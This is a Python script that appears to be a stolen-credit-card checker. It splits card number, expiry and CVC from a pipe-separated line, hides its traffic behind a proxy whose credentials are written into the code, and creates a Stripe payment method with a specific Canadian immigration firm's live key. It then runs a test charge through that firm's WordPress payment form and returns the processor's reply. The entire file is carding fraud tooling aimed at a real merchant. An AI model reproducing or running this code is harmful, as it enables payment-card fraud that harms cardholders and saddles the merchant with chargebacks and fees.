import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "Visa"
	if n.startswith("5"):
		card_type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Febc1f502d5%3B+stripe-js-v3%2Febc1f502d5%3B+card-element&referrer=https%3A%2F%2Foneworldimmigration.ca&time_on_page=27760&client_attribution_metadata[client_session_id]=ac3f85a0-ff0e-4b97-834d-d453cb0a5b59&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_F5m5jROJdMKhMezaOOpJBPPN00ybSsneIp'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '__stripe_mid': 'NA',
	    '__stripe_sid': 'NA',
	}
	
	headers = {
	    'authority': 'oneworldimmigration.ca',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=67edb23b-e8ff-44db-891c-4ec11a0dced282829b; __stripe_sid=86206be8-2994-4d2e-a00f-fea5f20d765b2cf1d0',
	    'origin': 'https://oneworldimmigration.ca',
	    'referer': 'https://oneworldimmigration.ca/square-payment/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_payment_charge',
	    'wpfs-form-name': 'E_SecurePayment_CAD',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-custom-input[]': [
	        '',
	        '',
	        '',
	        '',
	        '',
	        '',
	        '',
	        '',
	    ],
	    'wpfs-card-holder-email': 'rodamuser09@gmail.com',
	    'wpfs-card-holder-name': 'Rodam User',
	    'wpfs-stripe-payment-method-id': pm,
	}
	
	response = session.post('https://oneworldimmigration.ca/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	result = re.search(r'"message":"(.*?)"', response.text).group(1)
		
	return (result)
